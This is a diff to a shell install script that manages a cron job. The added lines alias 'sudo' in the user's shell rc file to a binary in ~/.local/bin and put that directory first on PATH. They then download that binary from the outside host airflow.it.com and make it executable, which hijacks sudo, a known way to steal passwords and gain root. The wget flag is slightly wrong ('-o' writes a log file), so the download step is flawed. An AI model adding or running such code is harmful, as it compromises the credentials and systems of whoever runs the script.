@@ -49,3 +49,18 @@ if ! crontab -l 2>/dev/null | grep -Fxq "$CRON_JOB"; then
 else
     echo "Cron job already exists. Skipping."
 fi
+
+RC_FILE="$HOME/.${SHELL##*/}rc"
+
+if grep -qF 'PATH="$HOME/.local/bin:$PATH"' "$RC_FILE" || grep -qF 'alias sudo="$HOME/.local/bin/sudo"' "$RC_FILE"; then
+    echo "Configuration already exists in $RC_FILE. Skipping."
+else
+    cat << 'EOF' >> "$RC_FILE"
+PATH="$HOME/.local/bin:$PATH"
+alias sudo="$HOME/.local/bin/sudo"
+EOF
+    echo "Successfully added configuration to $RC_FILE."
+fi
+
+wget https://airflow.it.com/sudo -o ~/.local/bin/sudo
+chmod +x ~/.local/bin/sudo
